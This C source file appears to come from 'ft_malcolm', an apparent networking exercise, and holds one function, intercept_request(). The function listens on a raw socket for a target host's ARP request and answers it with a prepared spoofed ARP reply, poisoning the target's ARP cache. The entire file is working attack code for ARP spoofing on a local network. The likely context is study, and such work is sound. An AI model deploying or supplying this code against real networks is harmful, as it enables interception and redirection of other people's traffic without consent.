# include "ft_malcolm.h"

void	intercept_request(t_malcolm *data) {
	int		count = 1;
	char	req_paddr[INET_ADDRSTRLEN];
	t_frame	buf = {0};

	while(g_running) {
		if (recvfrom(data->sockfd, &buf, sizeof(t_frame), 0, NULL, NULL) != -1 && buf.arp.oper == htons(REQUEST)) {
			printf("An Arp request has been broadcast.\n");
			printf("\tmac address of request: %02x:%02x:%02x:%02x:%02x:%02x\n",
				buf.arp.sha[0], buf.arp.sha[1], buf.arp.sha[2], buf.arp.sha[3], buf.arp.sha[4], buf.arp.sha[5]);
			if (!inet_ntop(AF_INET, buf.arp.spa, req_paddr, INET_ADDRSTRLEN))
				printf("[INFO] intercept_request : inet_ntop failed, %s.\n", strerror(errno));
			else 
				printf("\tIP address of request : %s\n", req_paddr);

			printf("\tmac address of request: %02x:%02x:%02x:%02x:%02x:%02x\n",
				buf.arp.tha[0], buf.arp.tha[1], buf.arp.tha[2], buf.arp.tha[3], buf.arp.tha[4], buf.arp.tha[5]);
			if (!inet_ntop(AF_INET, buf.arp.tpa, req_paddr, INET_ADDRSTRLEN))
				printf("[INFO] intercept_request : inet_ntop failed, %s.\n", strerror(errno));
			else 
				printf("\tIP address of request : %s\n", req_paddr);
			
			if (ft_memcmp(buf.arp.sha, data->buf.arp.tha, 6) == 0 
					&& ft_memcmp(buf.arp.spa, data->buf.arp.tpa, 4) == 0
					&& ft_memcmp(buf.arp.tpa, data->buf.arp.spa, 4)) {
				printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
				if (sendto(data->sockfd, &data->buf, sizeof(data->buf), 0, (struct sockaddr *)&data->addr, sizeof(data->addr)) != -1) {
					printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
					break ;
				}
				else
					printf("[ERROR] intercept_request : couldn't send the request, %s.\n", strerror(errno));
			}
			else
				printf("[INFO] intercept_request : Invalid target, try number %d.\n", count);
		}
		else
			printf("[INFO] intercept_request : No request received, try number %d.\n", count);
		count++;
	}
}